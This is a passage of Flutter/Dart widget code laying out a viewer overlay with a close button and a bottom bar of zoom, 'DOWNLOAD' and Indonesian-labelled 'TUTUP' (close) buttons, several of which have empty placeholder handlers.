              ),
            ),
            Positioned(
              top: 16,
              right: 16,
              child: GestureDetector(
                onTap: onClose,
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.close,
                    color: Colors.white,
                    size: 20,
                  ),
                ),
              ),
            ),
            Positioned(
              bottom: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.bottomCenter,
                    end: Alignment.topCenter,
                    colors: [Colors.black.withOpacity(0.75), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: Colors.white.withOpacity(0.1), width: 1),
                        ),
                        child: const Icon(Icons.zoom_out, color: Colors.white),
                      ),
                    ),
                    const SizedBox(width: 20),
                    const Text(
                      "100%",
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 12,
                        fontFamily: 'monospace',
                      ),
                    ),
                    const SizedBox(width: 20),
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: Colors.white.withOpacity(0.1), width: 1),
                        ),
                        child: const Icon(Icons.zoom_in, color: Colors.white),
                      ),
                    ),
                    const SizedBox(width: 24),
                    ElevatedButton.icon(
                      onPressed: () {},
                      icon: const Icon(Icons.download, size: 18),
                      label: const Text("DOWNLOAD"),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.blueAccent.withOpacity(0.2),
                        foregroundColor: Colors.white,
                      ),
                    ),
                    const SizedBox(width: 12),
                    ElevatedButton.icon(
                      onPressed: onClose,
                      icon: const Icon(Icons.close, size: 18),
                      label: const Text("TUTUP"),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.white.withOpacity(0.1),
                        foregroundColor: Colors.white,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}